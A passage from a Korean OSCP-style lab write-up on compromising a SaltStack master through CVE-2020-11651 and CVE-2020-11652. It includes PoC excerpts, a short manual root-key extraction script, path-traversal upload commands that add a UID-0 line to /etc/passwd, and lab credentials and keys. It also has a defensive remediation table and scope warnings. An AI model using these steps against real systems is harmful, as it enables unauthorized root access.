**`ping`은 되는데 `_prep_auth_info`가 `{}`를 주면 패치된 마스터다.** 이 판별은 소스에서 도출한 것이고 실기로 확인하지는 않았다 `[가정]`.

**버전을 못 얻으면 "행위 차이"로 판정한다 — 일반화된 기법**
버전 배너가 없는 서비스는 흔하다. 그때는 **패치 전후로 동작이 갈리는 요청 한 쌍**을 찾는다:
1. **정상 요청**(양쪽 다 응답) — 서비스가 살아 있다는 기준선
2. **취약점을 건드리는 요청** — 응답이 갈린다

두 요청의 결과를 비교하면 "서비스가 죽어서 응답이 없는 것"과 "패치돼서 거부된 것"을 구분할 수 있다. 기준선 요청 없이 취약점 요청만 던지면 무응답의 의미를 알 수 없다.

**공개 PoC를 쓸 때의 3대 함정**
1. **README ≠ 코드.** README는 몇 년째 갱신 안 된 경우가 많다. **`git log`와 실제 소스를 본다**
2. **버전 문자열이 누구 것인지 확인하라.** 로컬 라이브러리 버전을 타겟 버전으로 착각하기 쉽다
3. **성공/실패 판정 로직을 직접 읽어라.** 이 PoC는 `jid` 존재 여부로 "성공"을 찍는다(②)

**시험장에서 PoC를 받으면 실행 전에 30초만 소스를 훑어라.** 어디에 하드코딩이 있는지, 무엇을 근거로 성공을 판정하는지만 봐도 헤매는 시간이 크게 줄어든다.

### ④ `--run-checks`(`-c`)는 실행하면 죽는다 — 쓰지 마라

PoC에는 `-c` 옵션이 있고 이름만 보면 "취약 여부 전체 점검"처럼 읽힌다. **소스를 보면 원격 공격용이 아니다.** 주석이 명시한다:

```python
# exploit.py:323
    if args.run_checks:
        # Assuming this check runs on the master itself, create a file with "secret" content
        # and abuse CVE-2020-11652 to read it.
        top_secret_file_path = '/tmp/salt_cve_teta'
        with salt.utils.fopen(top_secret_file_path, 'w') as fd:
            fd.write("top secret")

        # Again, this assumes we're running this check on the master itself
        with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd:
            root_key = keyfd.read()
```

마스터 자기 자신에서 돌리는 방어자용 점검 코드다. 게다가 코드가 세 군데 깨져 있다:

| 위치 | 버그 | 증상 |
|---|---|---|
| `exploit.py:327`, `331` | `salt.utils.fopen`은 **최신 salt에서 제거된 API**다 (`salt.utils.files.fopen`으로 이동) | `AttributeError` |
| `exploit.py:334` | `debug`를 전역 이름으로 참조 — 실제 변수는 `args.debug` | `NameError: name 'debug' is not defined` |
| `exploit.py:150` | `pp(rets)` — **`pp`가 어디에도 정의돼 있지 않다** (`pprint` import 누락으로 보인다) | `NameError: name 'pp' is not defined` |

**결론: `-c`는 건드리지 마라.** 취약 여부는 인자 없이 실행하는 것(3-1)으로 이미 판정된다.

### ⑤ `--force`(`-f`)는 아무 일도 하지 않는다

```python
# exploit.py:294
    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')
```

`default=False`인데 `action='store_false'`다. **`-f`를 줘도 `False`, 안 줘도 `False`** — 값이 바뀔 수 없다. 게다가 `args.force`는 스크립트 어디에서도 읽히지 않는다. 완전한 죽은 옵션이다.

`--force`가 있으니 "취약하지 않아 보여도 강제 실행" 같은 걸 기대하게 되는데, ③의 커밋에서 버전 판정이 통째로 사라지면서 이 옵션이 제어하던 대상 자체가 없어졌다. 옵션만 남았다.

### ⑥ 읽기는 절대경로, 쓰기는 상대경로 — 비대칭에 걸린다

같은 wheel 모듈인데 PoC의 인터페이스가 다르다:

```bash
python3 exploit.py --master <ip> -r /etc/passwd                      # 절대경로 OK
python3 exploit.py --master <ip> --upload-dest ../../../../../etc/passwd  # 상대경로만
```

`--upload-dest`에 `/etc/passwd`를 주면 `[-] Destination path must be relative; aborting`으로 끝난다(`exploit.py:345`의 `os.path.isabs` 검사). 읽기 쪽에는 그 검사가 없다.

처음에 이 비대칭을 모르고 절대경로로 업로드를 시도했다면 "쓰기는 안 되나 보다"로 오판할 수 있다. 실제로는 `../`만 붙이면 된다. 에러 메시지가 친절해서 다행이었지만, 에러 메시지를 읽지 않고 다른 경로를 찾아 나서는 것이 시험장에서 시간을 태우는 전형이다.

### ⑦ 시도하지 않은 것 — `--exec-all`

PoC에는 **연결된 모든 미니언**에서 명령을 실행하는 옵션이 있다:

```python
# exploit.py:262
def pwn_exec_all(channel, root_key, cmd, master_ip, jid):
    msg = {
        'key': root_key,
        'cmd': '_send_pub',
        'fun': 'cmd.run',
        'user': 'root',
        'arg': [ "/bin/sh -c '{}'".format(cmd) ],
        'tgt': '*',
        'tgt_type': 'glob',
        ...
    }
```

**`cmd: '_send_pub'`도 밑줄 하나짜리 내부 헬퍼다** — 즉 이것 역시 CVE-2020-11651의 사정권이었다. 취약 버전의 원문을 보면 인증·인가 코드가 **한 줄도 없다**:

```python
    def _send_pub(self, load):
        '''
        Take a load and send it across the network to connected minions
        '''
        for transport, opts in iter_transport_opts(self.opts):
            chan = salt.transport.server.PubServerChannel.factory(opts)
            chan.publish(load)
```

정상 경로인 `ClearFuncs.publish()`는 `_prep_auth_info()` → `check_authentication()`을 거치지만, `_send_pub`는 그 단계를 통째로 건너뛰고 4505 PUB 소켓에 직접 밀어넣는다. PoC가 `key: root_key`를 함께 보내지만 **실은 필요조차 없다** — root key 없이도 모든 미니언에서 명령이 실행된다.

**즉 이 옵션은 CVE-2020-11651의 두 번째 얼굴이다.** NVD 설명이 "retrieve user tokens **and/or run arbitrary commands on salt minions**"라고 두 가지를 말하는 이유가 이것이다.

**그럼에도 쓰지 않았고, 쓰면 안 됐다.** `tgt: '*'`는 마스터에 붙어 있는 모든 호스트를 뜻한다. 랩이라 미니언이 없었을 가능성이 높지만, 스코프 밖 호스트에 명령이 나갈 위험이 있는 옵션이다. PoC 자신도 실행 전에 경고를 띄우고 2초 기다린다(`[!] Lester, is this what you want?`).

> [!danger] 스코프 규율 — 시험이든 실전이든
> `tgt: '*'` · `--exec-all` · 워크스테이션 대량 배포 같은 옵션은 **인가 범위를 넘길 수 있다.**
> OSCP 시험에서 다른 응시자의 박스나 인프라를 건드리면 실격이다. **"모든 호스트"를 뜻하는 인자가 보이면 손을 뗀다.**
> 이 박스에서 필요한 것은 마스터 한 대의 root였고, `--upload-*`로 충분했다.

### ⑧ 시간 배분 복기

| 구간 | 소요 | 평가 |
|---|---|---|
| nmap (09:39→09:40) | 1분 | ✅ `--min-rate 5000` 덕분 |
| `zmtp` 검색 → SaltStack 확정 | 약 30분 `[가정]` | ❌ 포트 번호로 검색했으면 5분. 최대 손실 구간 |
| PoC clone → root key 획득 (11:12) | 빠름 | ✅ |
| `--exec` 시도와 실패 판정 | 약 20분 `[가정]` | 🟡 실패 자체는 정상. **다만 리버스셸에 재도전하지 않고 원시를 바꾼 것이 좋은 판단** |
| passwd 조립 → 업로드 (13:00) | — | ✅ |
| SSH root 로그인 (13:49) | — | ✅ |

**손절선**: 리버스셸은 **두 번 실패하면 포기**한다. 포트를 바꿔(443/53) 한 번 더 시도하고, 그래도 안 되면 셸을 요구하지 않는 경로(파일 쓰기 · 크론 · SSH 키 · `/etc/passwd`)로 즉시 전환한다. 이 박스에서는 그 전환이 정확히 정답이었다.

---

## 7. OSCP 시험 관점 — 이 상황을 다시 만나면 뭘 먼저 치는가

1. **낯선 포트를 보면 이름이 아니라 번호로 검색한다.** `nmap`의 `SERVICE` 칼럼은 전송 계층 이름일 수 있다. `"4505" "4506"` 검색이 `zmtp exploit`보다 30분 빠르다. 외워둘 쌍: **4505/4506=SaltStack · 8000=salt-api/Django · 6379=Redis · 2375=Docker · 8500=Consul · 9200=Elasticsearch · 11211=memcached**
2. **`-p-`를 안 붙였으면 이 박스는 못 푼다.** 4505/4506은 기본 1000포트 밖이다. **전 포트 스캔은 선택이 아니라 기본**이고, `--min-rate 5000`으로 1분 안에 끝낼 수 있다. 백그라운드로 돌려놓고 다른 걸 하면 된다
3. **salt-master(4506)를 만나면 첫 수는 `{'cmd': '_prep_auth_info'}` 한 발이다.** 응답이 오면 인증 없이 root key를 얻은 것이고, 그 순간 게임이 끝난다. PoC 없이 수동으로도 된다 — 아래 8번
4. **임의 파일 읽기를 얻으면 `/etc/passwd`부터 읽는다.** OS·앱·계정 구조를 한 번에 준다. 그다음 `/etc/shadow` → `/root/.ssh/id_rsa` → `/root/proof.txt` → 앱 설정 파일
5. **임의 파일 쓰기(root)를 얻으면 `/etc/passwd`에 UID 0 줄을 추가한다.** `openssl passwd <비번>` → `이름:<해시>:0:0:root:/root:/bin/bash`. **핵심은 UID가 0이고 비밀번호 필드에 해시를 직접 넣는 것**이다. shadow는 건드릴 필요 없다
6. **덮어쓰기 원시라면 반드시 먼저 읽어라.** `file_roots.write`는 파일을 교체한다. 새 줄만 올리면 시스템을 부순다. **읽기 → 로컬 편집 → 전체 쓰기**가 불변의 순서다
7. **`../`는 넉넉히 넣는다.** 루트에서 `..`는 자기 자신이라 초과분은 무해하다. 기준 디렉터리 깊이를 모를 때는 5~8개
8. **⚠️ 자동 도구 관점 — 이 박스는 통과다.** `sqlmap`(명시적 금지)을 쓰지 않았고 Metasploit(1대 한정)도 쓰지 않았다. 쓴 것은 **공개 파이썬 PoC 한 개**이며 OSCP는 단독 PoC 스크립트를 금지하지 않는다 — 제한 대상의 정의가 "**스스로 취약점을 발견해** 자동으로 익스플로잇하는" 도구이기 때문이다.
   참고로 **AutoRecon은 금지 도구가 아니다**(열거 전용이라 규정에 언급조차 없다). 쓰지 않은 이유는 규정이 아니라 습관 — 손으로 밟아야 도구가 놓칠 때 살아남는다.
   **다만 PoC가 없다고 가정한 수동 대안을 반드시 갖고 있어라** — 이 CVE는 파이썬 몇 줄이면 끝난다:
   ```python
   # PoC 없이 root key만 뽑기 (salt 라이브러리는 필요)
   import salt.transport.client
   cfg = {'transport':'zeromq','pki_dir':'/tmp','id':'root',
          'master_ip':'TARGET','master_port':'4506',
          'auth_timeout':5,'auth_tries':1,
          'master_uri':'tcp://TARGET:4506'}
   ch = salt.transport.client.ReqChannel.factory(cfg, crypt='clear')
   print(ch.send({'cmd':'_prep_auth_info'}, timeout=3)[2]['root'])
   ```
   **`crypt='clear'`가 전부다** — 이게 `enc: 'clear'`를 만들어 `ClearFuncs` 경로로 보낸다. 빼면 `aes` 채널이 되고 키가 없어 핸드셰이크부터 실패한다
9. **"작업이 예약되었다"를 성공으로 읽지 마라.** 비동기 API는 접수증만 준다. **리스너·파일 되읽기 같은 도구 바깥의 증거**로 확인한다
10. **리버스셸이 두 번 실패하면 원시를 바꿔라.** 포트 변경(443/53) 한 번만 더 시도하고, 안 되면 셸을 요구하지 않는 경로로 간다. 이 박스에서 `--exec`를 붙들고 늘어졌다면 몇 시간을 태웠을 것이다
11. **공개 PoC는 실행 전에 소스를 30초 훑어라.** 하드코딩된 값(`user: 'sudo_user'`), 성공 판정 로직(`if rets.get('jid')`), 죽은 옵션(`--force`), 깨진 코드 경로(`--run-checks`)가 흔하다. README는 코드보다 오래됐다고 가정한다
12. **`openssl passwd`가 가장 안전한 해시 생성기다.** Python 3.13에서 `crypt` 모듈이 제거됐으므로 `python3 -c 'import crypt'` 원라이너는 최신 kali에서 죽는다. `mkpasswd`는 없을 수 있다. **`openssl passwd`는 거의 항상 있다**
13. **셸을 잡자마자 칠 5개** — root를 이미 얻었더라도 습관으로 굳힌다: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.*`
14. **증거는 `whoami; hostname; ip a | grep 'inet '; cat /root/proof.txt`를 한 화면에.** 이 박스의 실제 스크린샷에는 `ip a`가 빠져 있다 — 시험이었으면 감점이다
15. **`tgt: '*'`처럼 "전체"를 뜻하는 인자가 보이면 손을 뗀다.** 스코프 위반은 실격 사유다

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| salt-master 4505/4506이 인터넷/신뢰 밖 네트워크에 노출 | 근본 조치. 관리 평면은 관리 VLAN·VPN 안에만 둔다. 방화벽으로 미니언 IP만 허용. **이 하나만으로 CVE-2020-11651이 원격에서 무의미해진다** |
| 취약 버전 salt 방치 (CVE-2020-11651/11652) | **2019.2.4 또는 3000.2 이상**으로 업그레이드. NVD 9.8 · 벤더 자체 등급 10.0 · **CISA KEV 등재(실제 악용 확인)** — 즉시 적용 대상이다. 구 브랜치(2015.8~2018.3)는 공개 릴리스가 없으므로 벤더 KB 패치를 받아야 한다 |
| `ClearFuncs` 디스패처가 **거부 목록**(`startswith('__')`)만 사용 | 벤더 패치가 `TransportMethods.get_method()` + `expose_methods` **허용 목록**으로 교체. 자체 개발 코드에도 같은 원칙 — **문자열로 함수를 고를 때는 반드시 allowlist.** "위험한 이름을 세는" 방어는 항상 빠뜨린다 |
| 검증 함수가 있는데 호출되지 않음 | `clean_path()`는 취약 버전에도 존재했으나 `file_roots`가 부르지 않았다. "유틸 함수가 있다"와 "위험 지점에서 실제로 불린다"는 다르다 — 정적 분석·코드 리뷰에서 호출 지점을 세어라 |
| `wheel file_roots.read/write`가 경로를 정규화하지 않음 | 벤더 패치의 `salt.utils.verify.clean_path()` — `normpath`+`realpath`로 접은 뒤 루트 내부인지 비교. 자체 코드에서도 **문자열 필터링이 아니라 정규화 후 비교** |
| salt-master가 root로 실행 | salt는 `user:` 설정으로 비특권 계정 실행을 지원한다. root가 아니면 `/etc/passwd` 쓰기가 실패했을 것 — **최소권한이 익스플로잇 체인을 끊는다** |
| SSH가 비밀번호 인증 허용 | `PasswordAuthentication no` + 공개키 전용. 그러면 `/etc/passwd`에 해시를 심어도 로그인이 안 된다 — **체인의 마지막 고리를 끊는다** |
| SSH가 UID 0 계정 로그인 허용 | `PermitRootLogin no`는 계정명 `root`만 막는다. **UID 0인 다른 이름은 못 막는다.** `AllowUsers`/`AllowGroups` **허용 목록**으로 로그인 가능 계정을 명시해야 실효가 있다 |
| `/etc/passwd` 변조 탐지 없음 | AIDE·Tripwire·auditd(`-w /etc/passwd -p wa`)로 무결성 감시. **UID 0 계정이 둘 이상 생기면 즉시 경보** — 한 줄짜리 점검: `awk -F: '$3==0' /etc/passwd` |
| 아웃바운드가 부분적으로만 통제 | 서버의 **아웃바운드 기본 정책을 deny**로 두면 리버스셸 전 계열이 죽는다. 이 박스에서 `--exec`가 실패한 이유일 가능성이 있다 `[가정]` — 의도된 통제였다면 옳은 설정이다 |
| 관리 평면과 웹 서비스가 같은 호스트 | Mezzanine CMS(80)와 salt-master가 한 대에 있다. **구성관리 마스터는 전용 호스트**에 둔다 — 마스터가 뚫리면 관리 대상 전체가 뚫린다 |

---

## 9. 참고 자료

- **CVE-2020-11651** — SaltStack ClearFuncs 인증 우회 (root key 유출). NVD **9.8 CRITICAL**: https://nvd.nist.gov/vuln/detail/CVE-2020-11651
  > "The salt-master process ClearFuncs class does not properly validate method calls. This allows a remote user to access some methods without authentication."
- **CVE-2020-11652** — wheel `file_roots` 디렉터리 트래버설 (임의 파일 읽기/쓰기). NVD 6.5 MEDIUM · **CWE-22**: https://nvd.nist.gov/vuln/detail/CVE-2020-11652
- **패치 릴리스: 2019.2.4 · 3000.2.** 2015.8~2018.3 계열은 공개 릴리스 없이 SaltStack Enterprise KB로만 패치 배포
- **CISA KEV 등재 2021-11-03** (실제 악용 확인, 연방기관 조치기한 2022-05-03)
- **패치 커밋 (1차 사료)** — `saltstack/salt`, 작성자 Daniel A. Wozniak, 2020-04-13:
  - CVE-2020-11651: `a67d76b15615983d467ed81371b38b4a17e4f3b7` (3000.2) · `f47e4856497231eb672da2ce0df3e641581d47e6` (2019.2.4) — `salt/master.py`에 `TransportMethods`/`expose_methods` 도입
  - CVE-2020-11652: `cce7abad9c22d9d50ccee2813acabff8deca35dd` (3000.2) · `7bd0ab195fbec4f34523dad11149f741c154e2b7` (2019.2.4) — `file_roots.py`·`tokens/localfs.py`·`wheel/config.py`에 `clean_path()` 호출 추가
- **VMware VMSA-2020-0009** — vRealize Operations Manager의 Application Remote Collector 7.5/8.0이 Salt 번들. 11651을 **CVSSv3 10.0**(`S:C`)으로 등급
- F-Secure Labs 원 리서치·어드바이저리: https://labs.f-secure.com/advisories/saltstack-authorization-bypass/
- SaltStack 릴리스 공지: https://help.saltstack.com/hc/en-us/articles/360043056331-New-SaltStack-Release-Critical-Vulnerability
- Exploit-DB **48421** — "Saltstack 3000.1 - Remote Code Execution": https://www.exploit-db.com/exploits/48421
- 사용한 PoC: https://github.com/jasperla/CVE-2020-11651-poc (HEAD `eca6ba2`, 2020-07-10)
- 원 체크 스크립트: https://github.com/rossengeorgiev/salt-security-backports
- **취약 코드 원문 근거 — 태그 `v3000.1` (박스가 돌던 계열):**
  - `salt/master.py:1041` `MWorker._handle_payload()` — `{'aes': ..., 'clear': ...}[payload['enc']]` 분기. docstring에 실제 평문 페이로드 예시가 들어 있다
  - `salt/master.py:1080` `_handle_clear()` — `if cmd.startswith('__')` **거부 목록** + `getattr(self.clear_funcs, cmd)`
  - `salt/master.py:2153` `ClearFuncs._prep_auth_info()` — `key = self.key` 반환 지점
  - `salt/master.py:2196` `ClearFuncs._send_pub()` — 인증 코드 **0줄**. 미니언 임의 명령 실행 원시
  - `salt/wheel/file_roots.py` `find()`/`read()`/`write()` — `os.path.join`만 하고 정규화 없음. `write()`는 `isabs`만 막고 `os.makedirs()`까지 수행
  - `salt/transport/zeromq.py:720` `handle_message()` · `salt/transport/mixins/auth.py:153` `_decode_payload()` — `enc != 'aes'`면 복호화·검증 없이 통과
- **패치된 코드 확인 — kali에 pip 설치된 salt 3008.0:**
  - `salt/master.py:1972` `MWorker._handle_clear()` — `get_method()` 경유 디스패치
  - `salt/master.py:2097` `class TransportMethods` — `expose_methods` 허용 목록
  - `salt/master.py:3614` `class ClearFuncs` — 노출 6종 (`ping`/`publish`/`get_token`/`mk_token`/`wheel`/`runner`)
  - `salt/master.py:3998` `_prep_auth_info()` — 함수 본문은 취약 버전과 동일 (패치가 건드리지 않았다)
  - `salt/utils/verify.py:533` `clean_path()` — `normpath` + `realpath` 검사
- Salt 아키텍처(4505 PUB / 4506 REP) 공식 문서: https://docs.saltproject.io/en/latest/topics/tutorials/firewall.html
- ZeroMQ ZMTP 사양: https://rfc.zeromq.org/spec/23/
- `crypt(3)` 해시 형식(`$1$`/`$5$`/`$6$`) — `man 5 crypt`

## 남긴 흔적 (랩 정리용)

- **`/etc/passwd` 변조** — 마지막 줄에 `qq:$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0:0:0:root:/root:/bin/bash` 추가. **원복하지 않았다.** 실전이라면 이 줄을 제거하고 원본 해시·타임스탬프를 복원해야 한다
- **root key 유출** — `ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=`. 실전 보고서라면 마스터 키 회전(`/var/cache/salt/master/.root_key` 재생성 + salt-master 재시작)을 권고 항목에 넣는다
- **예약된 job** — `20260611035400329542` (실행 여부 불명, 6장 ②). job cache에 흔적이 남는다
- 획득 자격증명: 직접 심은 `qq` / `a123a123` (UID 0)
- 공격자 VPN IP: `192.168.45.173` · 타겟: `192.168.189.62`

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Access]] · [[Flu]] · [[Clue]] — 같은 `/etc/passwd` UID 0 추가 기법
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]] — 누적 패턴 **"응답이 성공을 뜻하지 않는다"**. 이 박스의 `Successfully scheduled job`이 같은 계열이다
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 누적 패턴 "버전 판정은 독립 근거 2개". 여기서는 **nmap OS 추정이 쓸모없었고 `/etc/passwd`가 확정 근거**였다
- [[Squid]] — "외부에서 보이는 포트가 전부가 아니다"의 다른 판. 여기서는 `-p-`가 그 역할을 했다
- [[_STATUS]] — PG 283개 전수 진행현황
